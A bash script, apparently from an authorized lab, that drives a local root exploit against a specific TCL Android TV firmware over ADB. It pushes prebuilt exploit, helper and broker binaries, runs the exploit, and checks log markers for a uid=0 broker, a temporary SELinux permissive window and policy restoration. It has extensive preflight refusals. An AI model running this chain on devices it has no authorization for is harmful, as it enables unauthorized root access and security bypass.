#!/bin/bash
set -euo pipefail

PORT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
VERIFIER="$PORT/../tcl-root-verifier"
BUILD="$PORT/build/android34"
: "${ADB_TARGET:?Set ADB_TARGET to the authorized TV serial}"
ADB_VENDOR_KEYS=${ADB_VENDOR_KEYS:-${HOME}/.android/adbkey}
LAB_ROOT=${LAB_ROOT:-/lab}
STAMP=$(date -u +%Y%m%dT%H%M%SZ)
LOG_DIR=${LIVE_LOG_DIR:-$LAB_ROOT/10_LOGS/live-newselect-broker-$STAMP}
ADB=${ADB:-$(command -v adb)}
export ADB_VENDOR_KEYS

ROOT_REMOTE=/data/local/tmp/ghostlock-v643-newselect-broker-proof
HELPER_REMOTE=/data/local/tmp/tcl-v643-newselect-helper-broker-proof
BROKER_REMOTE=/data/local/tmp/tcl-root-broker-newselect-proof
CLIENT_REMOTE=/data/local/tmp/tcl-root-broker-min-client
WATCHDOG_REMOTE=/data/local/tmp/.tcl_root_broker_watchdog
RESTORE_POLICY_REMOTE=/vendor/etc/selinux/precompiled_sepolicy
ABSTRACT=tcl_root_newselect_proof

EXPECTED_ROOT=6529ef8f76bd6dda073850f5fe227b808bd05e1a1a90e13cff24d06bb1d91b91
EXPECTED_HELPER=4ca5692192b0a7598243f5070adf1e676ccd943aad4a292579ea69d38bbf1019
EXPECTED_BROKER=0de4201666a1a0cfccd363af77aa333ea29d9dea690517dbd7dda17ba06689ce
EXPECTED_CLIENT=a56167ebd2aa63df1d816bee1412481143a24d5da587acf193e081d1264f181c
EXPECTED_RESTORE_POLICY=1930f6750090c816a3ea8cc32f752e2eec9b9e6d10d2851fe001fd690b069819
EXPECTED_RESTORE_POLICY_SIZE=1030054

mkdir -p "$LOG_DIR"
exec > >(tee -a "$LOG_DIR/session.log") 2>&1

printf 'LIVE_NEWSELECT_BROKER start=%s target=%s\n' "$STAMP" "$ADB_TARGET"
test "$(sha256sum "$BUILD/ghostlock-tcl-v643-lab" | awk '{print $1}')" = "$EXPECTED_ROOT"
test "$(sha256sum "$BUILD/tcl-v643-mcast-helper" | awk '{print $1}')" = "$EXPECTED_HELPER"
test "$(sha256sum "$VERIFIER/build/tcl-root-broker" | awk '{print $1}')" = "$EXPECTED_BROKER"
test "$(sha256sum "$VERIFIER/build/tcl-root-broker-min-client" | awk '{print $1}')" = "$EXPECTED_CLIENT"

"$ADB" -s "$ADB_TARGET" get-state | grep -Fx device
state=$("$ADB" -s "$ADB_TARGET" shell '
  caps=$(for cap in network_peer_controls open_perms \
      extended_socket_class always_check_network cgroup_seclabel \
      nnp_nosuid_transition genfs_seclabel_symlinks ioctl_skip_cloexec; do
    cat "/sys/fs/selinux/policy_capabilities/$cap" 2>/dev/null || printf "?"
  done | tr -d "\r\n")
  printf "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" \
    "$(getprop ro.software.version_id)" "$(uname -r)" \
    "$(getprop ro.build.version.release)" "$(getprop sys.boot_completed)" \
    "$(getprop ro.boot.verifiedbootstate)" \
    "$(getprop ro.boot.vbmeta.device_state)" \
    "$(getprop ro.boot.veritymode)" "$(getenforce)" \
    "$(grep -Ec "^(kernelsu|resukisu|kowsu) " /proc/modules 2>/dev/null || true)" \
    "$caps"' \
  | tr -d '\r')
expected='V8-T653T01-LF1V643|5.15.180-android14-11|14|1|green|locked|enforcing|Enforcing|0|11100100'
if [ "$state" != "$expected" ]; then
  printf 'REFUSED unexpected_state=%s\n' "$state" >&2
  exit 3
fi

# The live policy exported by Linux 5.15 drops the Android netlink route and
# getneigh header bits.  Restoration therefore uses only this exact combined
# V643 boot policy from the verified, read-only vendor partition.
restore_policy_identity=$("$ADB" -s "$ADB_TARGET" shell \
  "sha256sum '$RESTORE_POLICY_REMOTE'; wc -c < '$RESTORE_POLICY_REMOTE'" \
  | tr -d '\r')
restore_policy_hash=$(printf '%s\n' "$restore_policy_identity" \
  | sed -n '1s/[[:space:]].*//p')
restore_policy_size=$(printf '%s\n' "$restore_policy_identity" \
  | tail -n 1 | tr -d '[:space:]')
if [ "$restore_policy_hash" != "$EXPECTED_RESTORE_POLICY" ] ||
   [ "$restore_policy_size" != "$EXPECTED_RESTORE_POLICY_SIZE" ]; then
  printf 'REFUSED restore_policy hash=%s size=%s\n' \
    "${restore_policy_hash:-missing}" "${restore_policy_size:-missing}" >&2
  exit 3
fi
printf 'LIVE_NEWSELECT restore_policy=%s size=%s path=%s\n' \
  "$restore_policy_hash" "$restore_policy_size" "$RESTORE_POLICY_REMOTE"

uptime_raw=$("$ADB" -s "$ADB_TARGET" shell cat /proc/uptime \
  | tr -d '\r' | awk '{print $1}')
uptime_s=${uptime_raw%%.*}
case "$uptime_s" in
  ''|*[!0-9]*) printf 'REFUSED invalid uptime=%s\n' "$uptime_raw" >&2; exit 3 ;;
esac
if [ "$uptime_s" -gt 900 ]; then
  printf 'REFUSED boot is not fresh: uptime=%ss\n' "$uptime_s" >&2
  exit 3
fi

boot_id=$("$ADB" -s "$ADB_TARGET" shell cat /proc/sys/kernel/random/boot_id | tr -d '\r\n')
CLIENT_PID_REMOTE=/data/local/tmp/.tcl_root_broker_min_client_pid_$boot_id
printf 'LIVE_NEWSELECT preflight state=%s uptime=%s boot_id=%s\n' \
  "$state" "$uptime_raw" "$boot_id"

gate=/data/local/tmp/.tcl_newselect_broker_attempt_$boot_id
gate_result=$("$ADB" -s "$ADB_TARGET" shell \
  "if mkdir '$gate' 2>/dev/null; then echo ROOT_GATE_OK; else echo ROOT_GATE_EXISTS; fi" \
  | tr -d '\r')
if [ "$gate_result" != ROOT_GATE_OK ]; then
  printf 'REFUSED attempt gate already consumed: %s\n' "$gate" >&2
  exit 4
fi
printf 'LIVE_NEWSELECT gate=%s\n' "$gate"

"$ADB" -s "$ADB_TARGET" shell \
  "rm -f '$WATCHDOG_REMOTE' '$CLIENT_PID_REMOTE'"
test -z "$("$ADB" -s "$ADB_TARGET" shell \
  "test -e '$WATCHDOG_REMOTE' && echo PRESENT || true" | tr -d '\r')"

"$ADB" -s "$ADB_TARGET" push "$BUILD/ghostlock-tcl-v643-lab" "$ROOT_REMOTE"
"$ADB" -s "$ADB_TARGET" push "$BUILD/tcl-v643-mcast-helper" "$HELPER_REMOTE"
"$ADB" -s "$ADB_TARGET" push "$VERIFIER/build/tcl-root-broker" "$BROKER_REMOTE"
"$ADB" -s "$ADB_TARGET" push "$VERIFIER/build/tcl-root-broker-min-client" "$CLIENT_REMOTE"
"$ADB" -s "$ADB_TARGET" shell chmod 755 \
  "$ROOT_REMOTE" "$HELPER_REMOTE" "$BROKER_REMOTE" "$CLIENT_REMOTE"

device_hashes=$("$ADB" -s "$ADB_TARGET" shell \
  "sha256sum '$ROOT_REMOTE' '$HELPER_REMOTE' '$BROKER_REMOTE' '$CLIENT_REMOTE'" \
  | tr -d '\r')
printf '%s\n' "$device_hashes"
printf '%s\n' "$device_hashes" | grep -Fqx "$EXPECTED_ROOT  $ROOT_REMOTE"
printf '%s\n' "$device_hashes" | grep -Fqx "$EXPECTED_HELPER  $HELPER_REMOTE"
printf '%s\n' "$device_hashes" | grep -Fqx "$EXPECTED_BROKER  $BROKER_REMOTE"
printf '%s\n' "$device_hashes" | grep -Fqx "$EXPECTED_CLIENT  $CLIENT_REMOTE"

"$ADB" -s "$ADB_TARGET" shell "$HELPER_REMOTE --selftest" | tee "$LOG_DIR/helper-selftest.log"
"$ADB" -s "$ADB_TARGET" shell "$ROOT_REMOTE --capture-witness-preflight" \
  | tee "$LOG_DIR/pagemap-preflight.log"

monitor_stop="$LOG_DIR/adb-monitor.stop"
monitor_lost="$LOG_DIR/adb-was-lost"
monitor_pid=0
stop_monitor() {
  if [ "$monitor_pid" -gt 0 ]; then
    touch "$monitor_stop"
    wait "$monitor_pid" 2>/dev/null || true
    monitor_pid=0
  fi
}
trap stop_monitor EXIT INT TERM

(
  while [ ! -e "$monitor_stop" ]; do
    now=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    transport=$(timeout 3 "$ADB" -s "$ADB_TARGET" get-state 2>/dev/null || true)
    printf '%s state=%s\n' "$now" "${transport:-unavailable}"
    if [ "$transport" != device ]; then touch "$monitor_lost"; fi
    sleep 1
  done
) > "$LOG_DIR/adb-monitor.log" 2>&1 &
monitor_pid=$!

printf 'LIVE_NEWSELECT LAUNCH two-cycle volatile broker proof; no module or persistence\n'
set +e
"$ADB" -s "$ADB_TARGET" shell \
  "printf '%s\\n' \$\$ > '$CLIENT_PID_REMOTE'; exec $CLIENT_REMOTE $ABSTRACT 2000 0 0" \
  > "$LOG_DIR/client.log" 2>&1 &
client_adb_pid=$!
sleep 1
"$ADB" -s "$ADB_TARGET" shell \
  "cd /data/local/tmp && timeout 600 env \
TCL_CAPTURE_FORCE_PERF=1 \
TCL_PERF_WITNESS=1 TCL_PERF_WITNESS_ATTEMPTS=5 \
TCL_PERF_RING_LOOPS=20000 \
TCL_W2_ATTEMPTS=1 TCL_REUSE_ATTEMPTS=1 \
TCL_MCAST_HELPER=$HELPER_REMOTE \
GHOST_DIRECT_BROKER=$BROKER_REMOTE GHOST_BROKER_UID=2000 \
GHOST_BROKER_ABSTRACT=$ABSTRACT \
GHOST_SELINUX=1 GHOST_SELINUX_PRESERVE_INIT=1 \
GHOST_EXEC=1 GHOST_REBOOT=0 GHOST_MINIMAL=1 GHOST_SID_SCAN=0 \
FOPS_MAX_ATTEMPTS=1 CRED_ATTEMPTS=1 KSNITCH_VERBOSE=0 \
$ROOT_REMOTE --cred" 2>&1 | tee "$LOG_DIR/root.log"
root_rc=${PIPESTATUS[0]}
if [ "$root_rc" -ne 0 ]; then
  # No broker can appear after the exploit command has failed.  Stop only the
  # client created for this boot instead of waiting for its 120-second socket
  # retry loop.  Both the marker value and the local PID are narrowly scoped.
  remote_client_pid=$(timeout 5 "$ADB" -s "$ADB_TARGET" shell \
    "cat '$CLIENT_PID_REMOTE' 2>/dev/null || true" 2>/dev/null \
    | tr -d '\r\n' || true)
  case "$remote_client_pid" in
    ''|*[!0-9]*) ;;
    *) timeout 5 "$ADB" -s "$ADB_TARGET" shell \
         "kill $remote_client_pid 2>/dev/null || true" >/dev/null 2>&1 || true ;;
  esac
  for _ in $(seq 1 50); do
    kill -0 "$client_adb_pid" 2>/dev/null || break
    sleep 0.1
  done
  if kill -0 "$client_adb_pid" 2>/dev/null; then
    kill "$client_adb_pid" 2>/dev/null || true
  fi
fi
wait "$client_adb_pid"
client_rc=$?
set -e

adb_was_lost=0
if [ -e "$monitor_lost" ]; then adb_was_lost=1; fi
printf 'LIVE_NEWSELECT root_rc=%d client_rc=%d adb_was_lost=%d\n' \
  "$root_rc" "$client_rc" "$adb_was_lost"
cat "$LOG_DIR/client.log"

connected=0
after_boot=
for _ in $(seq 1 90); do
  timeout 5 "$ADB" connect "$ADB_TARGET" >/dev/null 2>&1 || true
  candidate=$(timeout 4 "$ADB" -s "$ADB_TARGET" shell \
    cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '\r\n' || true)
  if printf '%s\n' "$candidate" \
      | grep -Eq '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'; then
    after_boot=$candidate
    connected=1
    break
  fi
  sleep 2
done
if [ "$connected" -ne 1 ]; then
  stop_monitor
  trap - EXIT INT TERM
  sha256sum "$LOG_DIR"/*.log > "$LOG_DIR/SHA256SUMS"
  printf 'LIVE_NEWSELECT BLOCKED: ADB did not return; no runner-triggered reboot by policy\n' >&2
  exit 6
fi

if [ "$after_boot" != "$boot_id" ]; then
  stop_monitor
  trap - EXIT INT TERM
  "$ADB" -s "$ADB_TARGET" shell \
    'printf "bootreason=%s sys_last=%s\n" "$(getprop ro.boot.bootreason)" "$(getprop sys.boot.reason.last)"; ls -l /sys/fs/pstore 2>&1 || true' \
    | tee "$LOG_DIR/reboot-state.log"
  sha256sum "$LOG_DIR"/*.log > "$LOG_DIR/SHA256SUMS"
  printf 'LIVE_NEWSELECT FAIL: kernel rebooted during the attempt\n' >&2
  exit 7
fi

# Keep the transport monitor alive through the reconnect phase.  On the TCL
# the old broker cleanup could drop ADB only after both child commands had
# returned, which the former monitor window missed.
if [ -e "$monitor_lost" ]; then adb_was_lost=1; fi
if [ "$adb_was_lost" -eq 1 ]; then
  stop_monitor
  trap - EXIT INT TERM
  sha256sum "$LOG_DIR"/*.log > "$LOG_DIR/SHA256SUMS"
  printf 'LIVE_NEWSELECT FAIL: ADB transport was lost; root session left untouched and no reboot requested\n' >&2
  exit 8
fi

post_state=$("$ADB" -s "$ADB_TARGET" shell '
  caps=$(for cap in network_peer_controls open_perms \
      extended_socket_class always_check_network cgroup_seclabel \
      nnp_nosuid_transition genfs_seclabel_symlinks ioctl_skip_cloexec; do
    cat "/sys/fs/selinux/policy_capabilities/$cap" 2>/dev/null || printf "?"
  done | tr -d "\r\n")
  printf "boot=%s selinux=%s verified=%s vbmeta=%s verity=%s modules=%s policycaps=%s" \
    "$(getprop sys.boot_completed)" "$(getenforce)" \
    "$(getprop ro.boot.verifiedbootstate)" \
    "$(getprop ro.boot.vbmeta.device_state)" \
    "$(getprop ro.boot.veritymode)" \
    "$(grep -Ec "^(kernelsu|resukisu|kowsu) " /proc/modules 2>/dev/null || true)" \
    "$caps"' \
  | tr -d '\r')
processes=$("$ADB" -s "$ADB_TARGET" shell \
  "ps -A -o PID,NAME 2>/dev/null | grep -E 'tcl_gl_victim|ghostlock|tcl-root-brok|newselect-helper' || true" \
  | tr -d '\r')

expected_post='boot=1 selinux=Enforcing verified=green vbmeta=locked verity=enforcing modules=0 policycaps=11100100'
unexpected_processes=$(printf '%s\n' "$processes" \
  | grep -vE 'tcl_gl_victim|ghostlock-v643-newselect-broker-proof|tcl-root-brok' \
  || true)
holder_count=$(printf '%s\n' "$processes" \
  | grep -Ec 'tcl_gl_victim|ghostlock-v643-newselect-broker-proof' || true)
broker_count=$(printf '%s\n' "$processes" | grep -c 'tcl-root-brok' || true)
if [ "$post_state" != "$expected_post" ] ||
   [ -n "$unexpected_processes" ] || [ "$holder_count" -ne 1 ] ||
   [ "$broker_count" -ne 1 ]; then
  reason="post=$post_state holder_count=$holder_count broker_count=$broker_count unexpected=${unexpected_processes:-none}"
  stop_monitor
  trap - EXIT INT TERM
  sha256sum "$LOG_DIR"/*.log > "$LOG_DIR/SHA256SUMS"
  printf 'LIVE_NEWSELECT FAIL: unsafe post-state; no runner reboot requested: %s\n' "$reason" >&2
  exit 8
fi

stop_monitor
trap - EXIT INT TERM
printf 'LIVE_NEWSELECT after_boot=%s post_state=%s\n' "$after_boot" "$post_state"
printf 'LIVE_NEWSELECT residual_processes=%s\n' "${processes:-none}"

proof_ok=1
grep -Eq 'TCL capture witness: method=perf-regs .*block=[0-9]+ pfn_reference=-1 verdict=1' \
  "$LOG_DIR/root.log" || proof_ok=0
test "$(grep -c 'TCL split: erase=1 handler=1 cleanup=1 status=0 failures=0' "$LOG_DIR/root.log")" -ge 2 || proof_ok=0
grep -q 'TCL W2 verified before permissive window' "$LOG_DIR/root.log" || proof_ok=0
grep -q 'TCL victim root verified; parent uid=2000 remains unchanged' "$LOG_DIR/root.log" || proof_ok=0
grep -q 'TCL safe handoff: normalized broker' "$LOG_DIR/root.log" || proof_ok=0
grep -q 'SESSION uid=2000 broker_uid=0.*selinux=1' "$LOG_DIR/client.log" || proof_ok=0
grep -q 'policycaps=11100100 netlink=restored' "$LOG_DIR/client.log" || proof_ok=0
grep -q 'uid=0 euid=0 gid=0 egid=0.*selinux=1' "$LOG_DIR/client.log" || proof_ok=0
grep -q 'MINCLIENT PASS: root broker verified and stopped' "$LOG_DIR/client.log" || proof_ok=0

# The raw W2 holder and normalized broker deliberately remain alive with
# their descriptor tables pinned.  A successful proof must not reboot the
# television automatically; a later manual reboot remains the cleanup
# boundary for this volatile session.
sha256sum "$LOG_DIR"/*.log > "$LOG_DIR/SHA256SUMS"
if [ "$proof_ok" -ne 1 ]; then
  printf 'LIVE_NEWSELECT FAIL: proof markers incomplete; safe parked state retained without reboot\n' >&2
  exit 10
fi
printf 'LIVE_NEWSELECT PASS: root broker verified, SELinux/network restored, holder/broker parked, no automatic reboot, no module\n'
